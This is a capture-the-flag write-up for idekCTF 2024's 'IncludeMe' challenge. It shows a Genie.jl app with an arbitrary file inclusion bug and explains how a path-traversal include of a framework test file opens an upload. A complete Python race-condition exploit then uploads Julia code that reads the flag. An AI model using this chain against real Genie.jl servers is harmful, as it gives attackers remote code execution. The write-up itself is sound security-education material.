---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466R6QTS7DG%2F20250524%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250524T044818Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJGMEQCIAuFnWXBGemCb5h9QExWZpn1k61E0V2LXjwmEbiXBA0GAiAqr4XcTJfbV0lnOsr37zRTet3JiWpbfjLuLXGjsSbAGSqIBAj9%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMdiX09dv%2FixGE7bxKKtwDgBiWiFcXUe%2Flaz9%2FrvaqVVWzNBUoAmKCOgwVWtQCVRXz5s%2FNGiQkMvahA5pQ8qGLx62RTHUSJWQ%2Fg99ReVXme%2Fz%2FEvBCg3mInrGODBL3yXAEZR5FZSSUt10EgAtCwdvcTIUeMviJZqzKOFqLs%2F8XVQkGkpiqVGuzSR8sBPoGUudDr2QwsFPVE1HXWIj465sUztYU6nTwXtakuoHE4v0RO2ZwpO0G5mc9Qpstwh8wq9TXfhmrkiUu7zHg5MxeZ00NzCC%2BE8At9jHS4o%2FvN%2FEy4RBguiff3UjpE8iTeY%2BcLGUSMwagQYBJeNzPgHlxhWbG5l7p%2F0WVeF44wBn1kHoVaDByQRVL6y4JM%2Fk7XBDe%2FYTTHciv3TnSUdvbXJYxVD50EnmuaAP0xRAHv1Ez9yjxLhp9Vf3WxJQpe4ENncB5pKqhZZgsLe21PP3aQj%2BTZWiC9PLiKdBeNcxd3BmDOmpVtqiOTDoZ7nZBkuaQW%2BidsAdEI4aihGo8sZd0CNtuPWXBa41rFhKAL89bTPO%2BbYvk8VVKPAbPzsqy413Uc2d%2FJDXQxkmcWjY5YstYm3sqUO0Ew3aFt7MVm65WzX%2BrQ7VovQyP658QLIk%2FaMEZLVwtScABSxk0ltE1Z%2BG8EiwwzJLFwQY6pgFadjcFqUmYQ543FR1hziKX8P1pdGuRxGah77ArlL9J7wMjqcqGThgcAQlUJQdH7td6jmOlKZcv5yn4GieDHaOEYzZI41xwgVKBkArLepEc1azqQgyhBxovbOXveMNlcBIauVCoI%2Fcfmg6OaTgtRX6U%2FyE1EssvkrlUxNP5uTak6%2FGdBKK%2FK3Hh62JVRRpWulMmMvAwDb4muCnLfsdOWWPh0OSxbMPN\&X-Amz-Signature=9c1c72c1a3bd0fb752056ce4953874a3d670b6e7e76543466c3ae9d45247fe67\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
